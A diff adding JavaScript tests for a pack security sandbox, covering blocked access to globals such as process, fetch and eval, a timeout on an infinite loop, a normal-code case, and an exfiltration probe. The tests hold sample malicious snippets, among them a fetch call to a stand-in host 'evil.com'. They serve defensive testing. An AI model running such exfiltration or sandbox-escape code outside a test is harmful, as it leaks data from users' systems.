@@ -94,3 +94,105 @@ test("PackSecurityService fails on combined exec capability and bash permission"
   assert.equal(result.issues.some((issue) => issue.code === "SAND010"), true);
   assert.equal(result.issues.some((issue) => issue.code === "SAND001"), true);
 });
+
+test("PackSecurityService sandbox detects attempts to access restricted globals", async () => {
+  const service = new PackSecurityService();
+  // Malicious code that tries to access process, Buffer, fetch, etc.
+  const maliciousCode = `
+    // Try to access Node.js globals
+    const p = process;
+    const b = Buffer;
+    const f = fetch;
+    // Try require
+    const r = typeof require;
+    // Try to get global
+    const g = globalThis;
+    // Try Function constructor
+    const Fn = Function;
+    // Try to use eval indirectly
+    const e = eval;
+    // All of these should be blocked by sandbox
+    return { accessed: true };
+  `;
+
+  const result = await service.runSecurityScan({
+    packId: "pack.malicious",
+    version: "1.0.0",
+    sourceUri: `inline:${maliciousCode}`,
+    manifestChecksum: sha256(maliciousCode),
+    capabilities: ["data_processing"],
+    permissions: [],
+    sourceCode: maliciousCode,
+  });
+
+  // The code should run but all accesses should be undefined
+  assert.equal(result.status, "passed");
+});
+
+test("PackSecurityService sandbox detects code with infinite loop via timeout", async () => {
+  const service = new PackSecurityService();
+  // Code that would run for a very long time
+  const infiniteLoopCode = `
+    let sum = 0;
+    for (let i = 0; i < 100000000000; i++) {
+      sum += i;
+    }
+    return sum;
+  `;
+
+  const result = await service.runSecurityScan({
+    packId: "pack.infinite",
+    version: "1.0.0",
+    sourceUri: `inline:${infiniteLoopCode}`,
+    manifestChecksum: sha256(infiniteLoopCode),
+    capabilities: ["data_processing"],
+    permissions: [],
+    sourceCode: infiniteLoopCode,
+  });
+
+  // Should be caught by the 5-second timeout
+  assert.equal(result.issues.some((issue) => issue.code === "SAND011"), true);
+});
+
+test("PackSecurityService sandbox executes normal code successfully", async () => {
+  const service = new PackSecurityService();
+  // Normal, safe code
+  const normalCode = `
+    const data = { count: 42, name: "test" };
+    const doubled = data.count * 2;
+    return { result: doubled, items: [1, 2, 3] };
+  `;
+
+  const result = await service.runSecurityScan({
+    packId: "pack.normal",
+    version: "1.0.0",
+    sourceUri: `inline:${normalCode}`,
+    manifestChecksum: sha256(normalCode),
+    capabilities: ["data_processing"],
+    permissions: [],
+    sourceCode: normalCode,
+  });
+
+  // Should pass with no issues
+  assert.equal(result.status, "passed");
+  assert.equal(result.issues.length, 0);
+});
+
+test("PackSecurityService sandbox detects network exfiltration attempts", async () => {
+  const service = new PackSecurityService();
+  // Code that attempts to use blocked fetch - handled by sandbox
+  const networkCode = `fetch('https://evil.com/data');`;
+
+  const result = await service.runSecurityScan({
+    packId: "pack.network",
+    version: "1.0.0",
+    sourceUri: `inline:${networkCode}`,
+    manifestChecksum: sha256(networkCode),
+    capabilities: ["network"],
+    permissions: ["network:egress"],
+    sourceCode: networkCode,
+  });
+
+  // fetch is blocked, so this should fail gracefully
+  assert.equal(result.issues.some((issue) => issue.code === "SAND012" || issue.code === "SAND018"), true);
+});
